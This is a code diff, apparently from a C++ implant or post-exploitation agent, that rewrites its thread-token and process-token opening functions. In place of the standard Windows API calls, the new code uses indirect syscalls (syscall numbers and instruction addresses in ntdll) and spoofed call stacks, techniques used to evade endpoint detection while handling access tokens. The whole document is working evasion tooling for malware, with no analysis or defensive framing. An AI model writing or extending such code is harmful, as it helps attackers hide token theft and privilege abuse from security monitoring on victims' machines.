@@ -235,7 +235,37 @@ auto DECLFN Token::TdOpen(
     _In_  BOOL    OpenAsSelf,
     _Out_ HANDLE* TokenHandle
 ) -> BOOL {
-    return Self->Advapi32.OpenThreadToken( ThreadHandle, RightsAccess, OpenAsSelf, TokenHandle );
+    const UINT32 Flags = SYSCALL_FLAGS;
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+    if (!(Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF))) {
+        return Self->Advapi32.OpenThreadToken(
+            ThreadHandle, RightsAccess, OpenAsSelf, TokenHandle
+        );
+    }
+
+    UPTR Address = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].Instruction
+        : (UPTR)Self->Ntdll.NtOpenThreadTokenEx;
+
+    UPTR ssn = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].ssn
+        : 0;
+
+    if (Flags & SYSCALL_INDIRECT && !(Flags & SYSCALL_SPOOF)) {
+        SyscallExec(
+            Sys::OpenThToken, Status, ThreadHandle, 
+            RightsAccess, OpenAsSelf, 0, TokenHandle
+        );
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)ThreadHandle, (UPTR)RightsAccess,
+            (UPTR)OpenAsSelf, 0, (UPTR)TokenHandle
+        );
+    }
+
+    Self->Usf->NtStatusToError(Status);
+    return NT_SUCCESS(Status);
 }
 
 auto DECLFN Token::ProcOpen(
@@ -243,5 +273,34 @@ auto DECLFN Token::ProcOpen(
     _In_  ULONG   RightsAccess,
     _Out_ HANDLE* TokenHandle
 ) -> BOOL {
-    return Self->Advapi32.OpenProcessToken( ProcessHandle, RightsAccess, TokenHandle );
+    const UINT32 Flags  = SYSCALL_FLAGS;
+    NTSTATUS     Status = STATUS_UNSUCCESSFUL;
+
+    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        return Self->Advapi32.OpenProcessToken(
+            ProcessHandle, RightsAccess, TokenHandle
+        );
+    }
+
+    UPTR Address = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].Instruction
+        : (UPTR)Self->Ntdll.NtOpenProcessTokenEx;
+
+    UPTR ssn = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].ssn
+        : 0;
+
+    if (Flags & SYSCALL_INDIRECT && !(Flags & SYSCALL_SPOOF)) {
+        SyscallExec(Sys::OpenPrToken, Status, ProcessHandle,
+                   RightsAccess, 0, TokenHandle);
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)ProcessHandle, (UPTR)RightsAccess,
+            0, (UPTR)TokenHandle
+        );
+    }
+
+    Self->Usf->NtStatusToError(Status);
+
+    return NT_SUCCESS(Status);
 }
